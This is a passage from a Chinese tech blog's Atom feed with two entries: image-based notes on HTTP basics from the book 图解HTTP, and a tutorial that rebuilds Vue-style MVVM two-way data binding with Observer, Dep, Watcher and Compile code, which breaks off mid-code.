      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="HTTP" scheme="http://blog.poetries.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议系列（二）</title>
    <link href="http://blog.poetries.top/2018/02/26/http-2/"/>
    <id>http://blog.poetries.top/2018/02/26/http-2/</id>
    <published>2018-02-26T15:20:43.000Z</published>
    <updated>2018-08-23T01:41:37.471Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>图解HTTP一书</p></blockquote><h1 id="一、了解web及网络基础"><a href="#一、了解web及网络基础" class="headerlink" title="一、了解web及网络基础"></a>一、了解web及网络基础</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP1%3A了解web及网络基础.png" alt=""></p><blockquote><p>对于与<code>HTTP</code>相关的协议如<code>TCP</code>,<code>IP</code>,<code>DNS</code>,<code>ARP</code>等，它们之间协作关系如下：</p></blockquote><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/http_tcp_dns_arp.png" alt=""></p><h1 id="二、简单的HTTP协议"><a href="#二、简单的HTTP协议" class="headerlink" title="二、简单的HTTP协议"></a>二、简单的HTTP协议</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP2简单的HTTP协议.png" alt=""></p><h2 id="2-1-请求与响应"><a href="#2-1-请求与响应" class="headerlink" title="2.1 请求与响应"></a>2.1 请求与响应</h2><blockquote><p><code>HTTP</code>协议通过客户端(<code>request</code>)，服务器端(<code>response</code>)实现网络通信</p></blockquote><ul><li>请求报文：</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/request.png" alt=""></p><ul><li>响应报文：</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/reponses.png" alt=""></p><h2 id="2-2-HTTP非持久连接和持久连接"><a href="#2-2-HTTP非持久连接和持久连接" class="headerlink" title="2.2 HTTP非持久连接和持久连接"></a>2.2 HTTP非持久连接和持久连接</h2><blockquote><p><code>HTTP</code>既可以使用非持久连接（<code>nonpersistent connection</code>），也可以使用持久连接（<code>persistent connection</code>）。HTTP/1.0使用非持久连接，<code>HTTP/1.1</code>默认使用持久连接。</p></blockquote><ul><li>HTTP持久连接是使用同一个TCP连接来发送和接收多个<code>HTTP</code>请求/应答，而不是为每一个新的请求/应答打开新的连接的方法</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/HTTP_persistent_connection.png" alt=""></p><h2 id="2-3-HTTP管线化"><a href="#2-3-HTTP管线化" class="headerlink" title="2.3 HTTP管线化"></a>2.3 HTTP管线化</h2><ul><li>HTTP管线化将多个<code>HTTP</code>请求整批提交，而在发送过程中不需先等待服务端的回应。</li></ul><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/HTTP_pipelining.png" alt=""></p><h1 id="三、HTTP报文内HTTP信息"><a href="#三、HTTP报文内HTTP信息" class="headerlink" title="三、HTTP报文内HTTP信息"></a>三、HTTP报文内HTTP信息</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP3HTTP报文内HTTP信息.png" alt=""></p><h2 id="3-1-请求报文"><a href="#3-1-请求报文" class="headerlink" title="3.1 请求报文"></a>3.1 请求报文</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/1a4e7e6a-6d7b-38f1-af8a-043140034c8f.jpg" alt=""></p><p>下面是一个实际请求：</p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/412b4451-2738-3ebc-b1f6-a0cc13b9697b.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/cdc4dbbb-f98e-31d5-8270-3c37bf1c54e5.jpg" alt=""></p><h2 id="3-2-响应报文"><a href="#3-2-响应报文" class="headerlink" title="3.2 响应报文"></a>3.2 响应报文</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/0236098f-1a98-3a4f-ba6c-4a44c6ec4ed0.jpg" alt=""></p><p>以下是一个实际的HTTP响应报文： </p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/bddb00b6-a3e1-3112-a4f4-4b3cb8687c70.jpg" alt=""></p><h1 id="四、返回结果的HTTP状态码"><a href="#四、返回结果的HTTP状态码" class="headerlink" title="四、返回结果的HTTP状态码"></a>四、返回结果的HTTP状态码</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/http1.jpg" alt=""></p><h1 id="五、与HTTP协作的Web服务器"><a href="#五、与HTTP协作的Web服务器" class="headerlink" title="五、与HTTP协作的Web服务器"></a>五、与HTTP协作的Web服务器</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP5与HTTP协作的Web服务器.png" alt=""></p><h1 id="六、HTTP首部"><a href="#六、HTTP首部" class="headerlink" title="六、HTTP首部"></a>六、HTTP首部</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP6HTTP首部.png" alt=""></p><h2 id="6-1-通用首部字段"><a href="#6-1-通用首部字段" class="headerlink" title="6.1 通用首部字段"></a>6.1 通用首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header1.png" alt=""></p><h2 id="6-2-请求首部字段"><a href="#6-2-请求首部字段" class="headerlink" title="6.2 请求首部字段"></a>6.2 请求首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header2.png" alt=""></p><h2 id="6-3-响应首部字段"><a href="#6-3-响应首部字段" class="headerlink" title="6.3 响应首部字段"></a>6.3 响应首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header3.png" alt=""></p><h2 id="6-4-实体首部字段"><a href="#6-4-实体首部字段" class="headerlink" title="6.4 实体首部字段"></a>6.4 实体首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header4.png" alt=""></p><h2 id="6-5-为-Cookie-服务的首部字段"><a href="#6-5-为-Cookie-服务的首部字段" class="headerlink" title="6.5 为 Cookie 服务的首部字段"></a>6.5 为 Cookie 服务的首部字段</h2><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/header5.png" alt=""></p><h1 id="七、确保Web安全的Https"><a href="#七、确保Web安全的Https" class="headerlink" title="七、确保Web安全的Https"></a>七、确保Web安全的Https</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP7确保Web安全的Https.png" alt=""></p><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/img_0137.png" alt=""></p><h1 id="八、确认访问用户身份的认证"><a href="#八、确认访问用户身份的认证" class="headerlink" title="八、确认访问用户身份的认证"></a>八、确认访问用户身份的认证</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP8确认访问用户身份的认证.png" alt=""></p><h1 id="九、基于HTTP的功能追加协议"><a href="#九、基于HTTP的功能追加协议" class="headerlink" title="九、基于HTTP的功能追加协议"></a>九、基于HTTP的功能追加协议</h1><p><img src="https://raw.githubusercontent.com/BeginMan/BookNotes/master/HTTP/media/TOP9基于HTTP的功能追加协议.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;图解HTTP一书&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;一、了解web及网络基础&quot;&gt;&lt;a href=&quot;#一、了解web及网络基础&quot; class=&quot;headerlink&quot; title=&quot;一、了解web及网络基础&quot;&gt;&lt;/a&gt;一、了解web
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="HTTP" scheme="http://blog.poetries.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>实现数据的双向绑定mvvm-剖析Vue的原理</title>
    <link href="http://blog.poetries.top/2018/02/25/vue-mvvm/"/>
    <id>http://blog.poetries.top/2018/02/25/vue-mvvm/</id>
    <published>2018-02-25T09:12:32.000Z</published>
    <updated>2018-08-23T01:41:37.491Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>完成的效果</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mvvm-app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"word"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;word&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"sayHi"</span>&gt;</span>change model<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"observer.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"watcher.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"compile.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mvvm.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> vm = <span class="keyword">new</span> MVVM(&#123;</span></span><br><span class="line"><span class="javascript">    el: <span class="string">'#mvvm-app'</span>,</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="javascript">        word: <span class="string">'Hello World!'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="javascript">        sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.word = <span class="string">'Hi, everybody!'</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/1.gif" alt=""></p><h2 id="一、几种实现双向绑定的做法"><a href="#一、几种实现双向绑定的做法" class="headerlink" title="一、几种实现双向绑定的做法"></a>一、几种实现双向绑定的做法</h2><blockquote><p>目前几种主流的<code>mvc(vm)</code>框架都实现了单向数据绑定，而我所理解的双向数据绑定无非就是在单向绑定的基础上给可输入元素（<code>input</code>、<code>textare</code>等）添加了<code>change(input)</code>事件，来动态修改<code>model</code>和 <code>view</code>，并没有多高深。所以无需太过介怀是实现的单向或双向绑定。</p></blockquote><ul><li>发布者-订阅者模式（<code>backbone.js</code>）</li><li>脏值检查（<code>angular.js</code>） </li><li>数据劫持（<code>vue.js</code>） </li></ul><h3 id="1-1-发布者-订阅者模式"><a href="#1-1-发布者-订阅者模式" class="headerlink" title="1.1 发布者-订阅者模式"></a>1.1 发布者-订阅者模式</h3><ul><li>一般通过<code>sub</code>, <code>pub</code>的方式实现数据和视图的绑定监听，更新数据方式通常做法是 <code>vm.set(&#39;property&#39;, value)</code>，<a href="http://www.html-js.com/article/Study-of-twoway-data-binding-JavaScript-talk-about-JavaScript-every-day" target="_blank" rel="noopener">这里有篇文章讲的比较详细</a></li><li>这种方式现在毕竟太low了，我们更希望通过 <code>vm.property = value</code>这种方式更新数据，同时自动更新视图，于是有了下面两种方式</li></ul><h3 id="1-2-脏值检查"><a href="#1-2-脏值检查" class="headerlink" title="1.2 脏值检查"></a>1.2 脏值检查</h3><blockquote><p><code>angular.js</code> 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 <code>setInterval()</code> 定时轮询检测数据变动，当然Google不会这么low，angular只有在指定的事件触发时进入脏值检测，大致如下：</p></blockquote><ul><li><code>DOM</code>事件，譬如用户输入文本，点击按钮等。( <code>ng-click</code> ) </li><li><code>XHR</code>响应事件 ( <code>$http</code> ) </li><li>浏览器<code>Location</code>变更事件 ( <code>$location</code> ) </li><li><code>Timer</code>事件( <code>$timeout</code> , <code>$interval</code> ) </li><li>执行 <code>$digest()</code> 或 <code>$apply()</code></li></ul><h3 id="1-3-数据劫持"><a href="#1-3-数据劫持" class="headerlink" title="1.3 数据劫持"></a>1.3 数据劫持</h3><ul><li><code>vue.js</code>则是采用数据劫持结合发布者-订阅者模式的方式，通过<code>Object.defineProperty()</code>来劫持各个属性的<code>setter</code>，<code>getter</code>，在数据变动时发布消息给订阅者，触发相应的监听回调。</li></ul><h2 id="二、实现思路"><a href="#二、实现思路" class="headerlink" title="二、实现思路"></a>二、实现思路</h2><blockquote><p>已经了解到<code>vue</code>是通过数据劫持的方式来做数据绑定的，其中最核心的方法便是通过<code>Object.defineProperty()</code>来实现对属性的劫持，达到监听数据变动的目的，无疑这个方法是本文中最重要、最基础的内容之一，如果不熟悉<code>defineProperty</code>，猛戳<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">这里</a></p></blockquote><p><strong>要实现mvvm的双向绑定，就必须要实现以下几点</strong></p><ul><li>实现一个数据监听器<code>Observer</code>，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者</li><li>实现一个指令解析器<code>Compile</code>，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数</li><li>实现一个<code>Watcher</code>，作为连接<code>Observer</code>和<code>Compile</code>的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图</li><li><code>mvvm</code>入口函数，整合以上三者</li></ul><p>上述流程如图所示：</p><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/2.png" alt=""></p><h3 id="2-1-实现Observer"><a href="#2-1-实现Observer" class="headerlink" title="2.1 实现Observer"></a>2.1 实现Observer</h3><ul><li>我们知道可以利用<code>Obeject.defineProperty()</code>来监听属性变动</li><li>那么将需要<code>observe</code>的数据对象进行递归遍历，包括子属性对象的属性，都加上<code>setter</code>和<code>getter</code></li><li>这样的话，给这个对象的某个值赋值，就会触发<code>setter</code>，那么就能监听到了数据变化。相关代码可以是这样</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;<span class="attr">name</span>: <span class="string">'kindeng'</span>&#125;;</span><br><span class="line">observe(data);</span><br><span class="line">data.name = <span class="string">'dmq'</span>; <span class="comment">// 哈哈哈，监听到值变化了 kindeng --&gt; dmq</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">observe</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || <span class="keyword">typeof</span> data !== <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 取出所有属性遍历</span></span><br><span class="line">    <span class="built_in">Object</span>.keys(data).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    defineReactive(data, key, data[key]);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line">    observe(val); <span class="comment">// 监听子属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">        enumerable: <span class="literal">true</span>, <span class="comment">// 可枚举</span></span><br><span class="line">        configurable: <span class="literal">false</span>, <span class="comment">// 不能再define</span></span><br><span class="line">        get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;,</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'哈哈哈，监听到值变化了 '</span>, val, <span class="string">' --&gt; '</span>, newVal);</span><br><span class="line">            val = newVal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/observer.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/observer.js</a></li></ul><blockquote><p>这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发<code>notify</code>，再调用订阅者的<code>update</code>方法，代码改善之后是这样</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> dep = <span class="keyword">new</span> Dep();</span><br><span class="line">    observe(val); <span class="comment">// 监听子属性</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">        <span class="comment">// ... 省略</span></span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (val === newVal) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'哈哈哈，监听到值变化了 '</span>, val, <span class="string">' --&gt; '</span>, newVal);</span><br><span class="line">            val = newVal;</span><br><span class="line">            dep.notify(); <span class="comment">// 通知所有订阅者</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.subs = [];</span><br><span class="line">&#125;</span><br><span class="line">Dep.prototype = &#123;</span><br><span class="line">    addSub: <span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.push(sub);</span><br><span class="line">    &#125;,</span><br><span class="line">    notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">            sub.update();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>那么问题来了，谁是订阅者，怎么往订阅器添加订阅者？</li><li>没错，上面的思路整理中我们已经明确订阅者应该是<code>Watcher</code>, 而且<code>var dep = new Dep();</code>是在 <code>defineReactive</code>方法内部定义的，所以想通过<code>dep</code>添加订阅者，就必须要在闭包内操作，所以我们可以在<code>getter</code>里面动手脚：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Observer.js</span></span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除</span></span><br><span class="line">Dep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Watcher.js</span></span><br><span class="line">Watcher.prototype = &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">Dep.target = <span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">this</span>.value = data[key];<span class="comment">// 这里会触发属性的getter，从而添加订阅者</span></span><br><span class="line">Dep.target = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里已经实现了一个<code>Observer</code>了，已经具备了监听数据和数据变化通知订阅者的功能。那么接下来就是实现<code>Compile</code>了</li></ul><h3 id="2-2-实现Compile"><a href="#2-2-实现Compile" class="headerlink" title="2.2 实现Compile"></a>2.2 实现<code>Compile</code></h3><ul><li><code>compile</code>主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图</li><li>并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示</li></ul><p><img src="https://github.com/honeydlp/mvvm/raw/master/defineProperty/img/3.png" alt=""></p><ul><li>因为遍历解析的过程有多次操作<code>dom</code>节点，为提高性能和效率，会先将跟节点<code>el</code>转换成文档碎片<code>fragment</code>进行解析编译操作</li><li>解析完成，再将<code>fragment</code>添加回原来的真实<code>dom</code>节点中</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Compile</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el = <span class="keyword">this</span>.isElementNode(el) ? el : <span class="built_in">document</span>.querySelector(el);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.$el) &#123;</span><br><span class="line">        <span class="keyword">this</span>.$fragment = <span class="keyword">this</span>.node2Fragment(<span class="keyword">this</span>.$el);</span><br><span class="line">        <span class="keyword">this</span>.init();</span><br><span class="line">        <span class="keyword">this</span>.$el.appendChild(<span class="keyword">this</span>.$fragment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Compile.prototype = &#123;</span><br><span class="line">init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">this</span>.compileElement(<span class="keyword">this</span>.$fragment); &#125;,</span><br><span class="line">    node2Fragment: <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> fragment = <span class="built_in">document</span>.createDocumentFragment(), child;</span><br><span class="line">        <span class="comment">// 将原生节点拷贝到fragment</span></span><br><span class="line">        <span class="keyword">while</span> (child = el.firstChild) &#123;</span><br><span class="line">            fragment.appendChild(child);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fragment;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>compileElement</code>方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Compile.prototype = &#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">compileElement: <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> childNodes = el.childNodes, me = <span class="keyword">this</span>;</span><br><span class="line">        [].slice.call(childNodes).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> text = node.textContent;</span><br><span class="line">            <span class="keyword">var</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;<span class="comment">// 表达式文本</span></span><br><span class="line">            <span class="comment">// 按元素节点方式编译</span></span><br><span class="line">            <span class="keyword">if</span> (me.isElementNode(node)) &#123;</span><br><span class="line">                me.compile(node);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123;</span><br><span class="line">                me.compileText(node, <span class="built_in">RegExp</span>.$<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 遍历编译子节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.childNodes &amp;&amp; node.childNodes.length) &#123;</span><br><span class="line">                me.compileElement(node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    compile: <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> nodeAttrs = node.attributes, me = <span class="keyword">this</span>;</span><br><span class="line">        [].slice.call(nodeAttrs).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">attr</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 规定：指令以 v-xxx 命名</span></span><br><span class="line">            <span 